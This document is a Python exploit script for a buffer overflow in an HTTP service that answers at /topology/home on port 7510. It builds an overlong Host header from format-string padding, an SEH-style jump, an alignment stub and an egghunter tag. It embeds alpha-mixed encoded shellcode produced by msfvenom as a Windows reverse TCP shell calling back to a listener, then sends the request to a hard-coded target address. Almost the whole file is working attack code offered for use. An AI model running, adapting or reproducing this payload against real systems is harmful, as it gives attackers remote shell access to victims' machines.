#!/usr/bin/env python
#Author : Win Sam
import socket
import sys

crash="%n"* 1650
#crash2 ="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"

#"\x0a\x0d\x3a\x40"
#"\x30\x2f"
badchar = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e"
"\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d"
"\x2e\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3b\x3c\x3d\x3e\x3f"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b"
"\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69"
"\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78"
"\x79\x7a\x7b\x7c\x7d\x7e\x7f")


buf =  ""
buf += "\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += "\x65\x36\x4f\x71\x59\x5a\x4b\x4f\x36\x6f\x31\x52\x56"
buf += "\x32\x70\x6a\x36\x62\x52\x78\x5a\x6d\x74\x6e\x75\x6c"
buf += "\x75\x55\x31\x4a\x33\x44\x5a\x4f\x58\x38\x72\x77\x44"
buf += "\x70\x56\x50\x32\x74\x6e\x6b\x68\x7a\x4e\x4f\x53\x45"
buf += "\x69\x7a\x6c\x6f\x70\x75\x49\x77\x39\x6f\x6d\x37\x41"
buf += "\x41"

alignment="\x55\x58\x2d\x6C\x11\x11\x11\x05\x01\x2d\x12\x11"
crash2 ="A" * (81-4) + "\x71\x06\x70\x04" +"\x34\x0F\x01\x5A" +"\x43" +alignment + "\x48"*4 + buf + "D"*(700-len(alignment)-1-4-len(buf))

#root@kali:~# msfvenom -p windows/shell_reverse_tcp lhost=192.168.102.21 lport=5555 -f python BufferRegister=EDI -e x86/alpha_mixed
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 1 compatible encoders
#Attempting to encode payload with 1 iterations of x86/alpha_mixed
#x86/alpha_mixed succeeded with size 702 (iteration=0)
#x86/alpha_mixed chosen with final size 702
#Payload size: 702 bytes
#Final size of python file: 3358 bytes

buf =  ""
buf += "\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += "\x4b\x4c\x5a\x48\x6d\x52\x75\x50\x35\x50\x75\x50\x31"
buf += "\x70\x4b\x39\x7a\x45\x34\x71\x79\x50\x32\x44\x4c\x4b"
buf += "\x72\x70\x64\x70\x4e\x6b\x62\x72\x34\x4c\x6c\x4b\x61"
buf += "\x42\x75\x44\x4c\x4b\x50\x72\x75\x78\x66\x6f\x78\x37"
buf += "\x63\x7a\x36\x46\x45\x61\x39\x6f\x4c\x6c\x37\x4c\x50"
buf += "\x61\x63\x4c\x53\x32\x34\x6c\x37\x50\x4a\x61\x38\x4f"
buf += "\x44\x4d\x57\x71\x5a\x67\x59\x72\x49\x62\x30\x52\x30"
buf += "\x57\x6c\x4b\x73\x62\x66\x70\x4c\x4b\x52\x6a\x57\x4c"
buf += "\x6c\x4b\x50\x4c\x47\x61\x44\x38\x39\x73\x53\x78\x66"
buf += "\x61\x5a\x71\x76\x31\x4c\x4b\x42\x79\x51\x30\x53\x31"
buf += "\x78\x53\x6c\x4b\x33\x79\x76\x78\x69\x73\x77\x4a\x57"
buf += "\x39\x6e\x6b\x55\x64\x4e\x6b\x35\x51\x38\x56\x70\x31"
buf += "\x69\x6f\x4c\x6c\x4b\x71\x48\x4f\x36\x6d\x67\x71\x4b"
buf += "\x77\x46\x58\x69\x70\x74\x35\x6c\x36\x66\x63\x61\x6d"
buf += "\x78\x78\x67\x4b\x61\x6d\x54\x64\x44\x35\x38\x64\x66"
buf += "\x38\x6e\x6b\x72\x78\x36\x44\x65\x51\x69\x43\x51\x76"
buf += "\x6c\x4b\x36\x6c\x32\x6b\x4c\x4b\x31\x48\x37\x6c\x67"
buf += "\x71\x48\x53\x4c\x4b\x64\x44\x6e\x6b\x56\x61\x38\x50"
buf += "\x6f\x79\x32\x64\x54\x64\x36\x44\x31\x4b\x71\x4b\x45"
buf += "\x31\x66\x39\x50\x5a\x33\x61\x39\x6f\x6d\x30\x31\x4f"
buf += "\x51\x4f\x30\x5a\x4e\x6b\x74\x52\x58\x6b\x6c\x4d\x33"
buf += "\x6d\x55\x38\x56\x53\x74\x72\x55\x50\x57\x70\x50\x68"
buf += "\x34\x37\x54\x33\x46\x52\x33\x6f\x52\x74\x32\x48\x32"
buf += "\x6c\x53\x47\x34\x66\x76\x67\x4b\x4f\x39\x45\x58\x38"
buf += "\x6c\x50\x65\x51\x57\x70\x57\x70\x71\x39\x48\x44\x76"
buf += "\x34\x72\x70\x31\x78\x76\x49\x4d\x50\x70\x6b\x73\x30"
buf += "\x6b\x4f\x4a\x75\x72\x70\x70\x50\x70\x50\x62\x70\x37"
buf += "\x30\x42\x70\x57\x30\x72\x70\x31\x78\x39\x7a\x64\x4f"
buf += "\x79\x4f\x79\x70\x6b\x4f\x5a\x75\x4c\x57\x43\x5a\x66"
buf += "\x65\x52\x48\x39\x50\x69\x38\x75\x36\x46\x75\x73\x58"
buf += "\x77\x72\x33\x30\x76\x75\x38\x33\x4b\x39\x4d\x36\x43"
buf += "\x5a\x42\x30\x30\x56\x46\x37\x45\x38\x5a\x39\x4e\x45"
buf += "\x54\x34\x35\x31\x49\x6f\x78\x55\x4d\x55\x79\x50\x33"
buf += "\x44\x64\x4c\x49\x6f\x32\x6e\x57\x78\x43\x45\x7a\x4c"
buf += "\x62\x48\x4c\x30\x6f\x45\x69\x32\x33\x66\x6b\x4f\x39"
buf += "\x45\x71\x78\x55\x33\x52\x4d\x71\x74\x33\x30\x6d\x59"
buf += "\x59\x73\x70\x57\x73\x67\x53\x67\x56\x51\x6c\x36\x73"
buf += "\x5a\x36\x72\x33\x69\x32\x76\x6b\x52\x79\x6d\x30\x66"
buf += "\x4a\x67\x37\x34\x37\x54\x57\x4c\x46\x61\x33\x31\x4c"
buf += "\x4d\x33\x74\x71\x34\x72\x30\x7a\x66\x45\x50\x73\x74"
buf += "\x56\x34\x50\x50\x71\x46\x56\x36\x43\x66\x50\x46\x72"
buf += "\x76\x50\x4e\x33\x66\x30\x56\x33\x63\x50\x56\x73\x58"
buf += "\x30\x79\x7a\x6c\x75\x6f\x4b\x36\x79\x6f\x7a\x75\x4b"
buf += "\x39\x4b\x50\x42\x6e\x30\x56\x70\x46\x59\x6f\x56\x50"
buf += "\x53\x58\x76\x68\x4d\x57\x57\x6d\x51\x70\x69\x6f\x6e"
buf += "\x35\x4f\x4b\x58\x70\x4e\x55\x69\x32\x72\x76\x35\x38"
buf += "\x6d\x76\x4e\x75\x4d\x6d\x4d\x4d\x69\x6f\x79\x45\x45"
buf += "\x6c\x34\x46\x63\x4c\x45\x5a\x6b\x30\x59\x6b\x4b\x50"
buf += "\x61\x65\x77\x75\x6f\x4b\x77\x37\x45\x43\x61\x62\x52"
buf += "\x4f\x50\x6a\x75\x50\x36\x33\x59\x6f\x69\x45\x41\x41"
#5A010F34   5A               POP EDX
#5A010F35   5D               POP EBP
#5A010F36   C3               RETN

buffer="GET /topology/home HTTP/1.1\r\n"
buffer+="Host: "+crash+crash2+"\r\n"
buffer+="User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
buffer+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer+="Accept-Language: en-US,en;q=0.5\r\n"
buffer+="Accept-Encoding: gzip, deflate\r\n"
buffer+="Connection: close\r\n"
buffer+="Upgrade-Insecure-Requests: 1\r\n"
buffer+="Cache-Control: max-age=0\r\n\r\n"
buffer+="W00TW00T"+ buf + "\r\n"

exploit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exploit.connect(("192.168.39.240",7510))
exploit.send(buffer)
exploit.close()
